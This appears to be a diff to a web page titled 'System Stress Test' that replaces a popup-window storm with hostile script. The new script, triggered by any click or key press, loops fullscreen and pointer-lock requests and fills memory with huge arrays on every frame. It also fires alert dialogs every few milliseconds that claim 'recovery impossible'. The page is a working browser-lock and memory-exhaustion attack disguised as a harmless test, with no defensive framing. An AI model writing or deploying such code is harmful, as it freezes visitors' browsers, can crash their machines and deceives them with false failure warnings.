@@ -1,81 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>⚡ SYSTEM UPGRADE ⚡</title>
+    <title>⚡ SYSTEM STRESS TEST ⚡</title>
     <style>
         body { 
-            background: #000; 
-            color: #0f0; 
-            font-family: 'Courier New', Courier, monospace; 
-            height: 100vh; 
-            margin: 0;
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            overflow: hidden; 
-            cursor: crosshair; 
+            background: #000; color: #f00; 
+            font-family: 'Courier New', monospace; 
+            height: 100vh; margin: 0;
+            display: flex; align-items: center; justify-content: center;
+            overflow: hidden; cursor: none;
         }
-        h1 { 
-            font-size: 3rem; 
-            text-shadow: 0 0 10px #0f0; 
-            text-align: center;
-        }
+        h1 { font-size: 2rem; text-align: center; text-transform: uppercase; }
     </style>
 </head>
 <body>
-    <h1>[ INITIALIZE SYSTEM TEST ]<br><small style="font-size: 1rem;">(Click anywhere to begin)</small></h1>
+    <h1>[ CLICK TO INITIALIZE CORE ]</h1>
 
     <script>
-        const target = "https://github.io";
+        let memoryDrain = [];
 
-        function trigger() {
-            // 1. Trap the mouse and go Fullscreen
-            document.documentElement.requestFullscreen().catch(() => {});
-            document.body.requestPointerLock();
-
-            // 2. The Window Storm
-            let count = 0;
-            const storm = setInterval(() => {
-                const x = Math.random() * window.screen.width;
-                const y = Math.random() * window.screen.height;
-                const win = window.open(target, "win" + count, `width=200,height=200,left=${x},top=${y}`);
+        function kill() {
+            // 1. The Fullscreen / Pointer Lock Loop
+            // This runs ~60-120 times per second
+            function spam() {
+                document.documentElement.requestFullscreen().catch(() => {});
+                document.body.requestPointerLock();
                 
-                if (win) {
-                    win.blur();
-                    window.focus();
+                // 2. Exponential Memory Leak 
+                // Each frame, we add massive junk to RAM
+                for(let i = 0; i < 100; i++) {
+                    memoryDrain.push(new Array(1000000).fill("💀"));
                 }
                 
-                count++;
-                if (count > 100) clearInterval(storm);
-            }, 50);
+                requestAnimationFrame(spam);
+            }
 
-            // 3. The "Sticky" Loop
-            // Using a function that calls itself allows the browser 
-            // to re-render and re-fullscreen between alerts.
-            const persistentLock = () => {
-                // Re-enforce lock every time alert is closed
-                document.documentElement.requestFullscreen().catch(() => {});
-                
-                alert("⚠ SYSTEM OVERLOAD ⚠\nUNAUTHORIZED ACCESS DETECTED");
-                
-                // Rapid re-trigger
-                setTimeout(persistentLock, 10);
+            // 3. The Dialog Trap
+            // Spams alerts so fast the user can't move the mouse
+            const alertLoop = () => {
+                alert("CRITICAL SYSTEM FAILURE\nRECOVERY IMPOSSIBLE");
+                setTimeout(alertLoop, 5);
             };
 
-            // Start the lock after a tiny delay
-            setTimeout(persistentLock, 500);
+            spam();
+            alertLoop();
         }
 
-        // Activate on first click
-        window.onclick = trigger;
-
-        // Prevent Esc key from easily escaping (Chrome still allows long-press Esc)
-        window.onkeydown = (e) => {
-            if (e.key === "Escape") {
-                alert("STAY FOCUSED");
-                trigger();
-            }
-        };
+        // Trigger everything on first interaction
+        window.addEventListener('click', kill);
+        window.addEventListener('keydown', kill);
     </script>
 </body>
 </html>
